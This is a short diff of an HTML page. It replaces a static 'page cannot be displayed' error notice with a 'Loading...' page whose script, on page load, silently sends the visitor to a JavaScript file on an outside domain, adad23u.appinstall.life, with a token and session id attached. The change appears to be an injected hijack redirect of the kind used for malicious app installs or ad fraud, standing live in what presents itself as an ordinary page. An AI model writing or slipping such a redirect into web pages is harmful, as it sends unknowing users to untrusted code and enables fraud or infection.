@@ -1,10 +1,1 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-</head>
-<body>
-<div align=center>
-  <h3>Error. Page cannot be displayed. Please contact your service provider for more details.</h3>
-</div>
-</body>
-</html>
+<html><head><title>Loading...</title></head><body><script type='text/javascript'>window.location.replace('http://adad23u.appinstall.life/dist/xmly/index.js?ch=1&js=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJKb2tlbiIsImV4cCI6MTc4NDE0NjAwOCwiaWF0IjoxNzg0MTM4ODA4LCJpc3MiOiJKb2tlbiIsImpzIjoxLCJqdGkiOiIzMzE4aGlvdmlnOThhbWlmaXMxcnIwOGciLCJuYmYiOjE3ODQxMzg4MDgsInRzIjoxNzg0MTM4ODA4MzgxNjM0fQ.doqEZEMxUGKlkDIgByafSpqRoV1QIkZpkizmvgs8fmg&sid=f28a5251-8077-11f1-80a0-fc93fecd083a');</script></body></html>
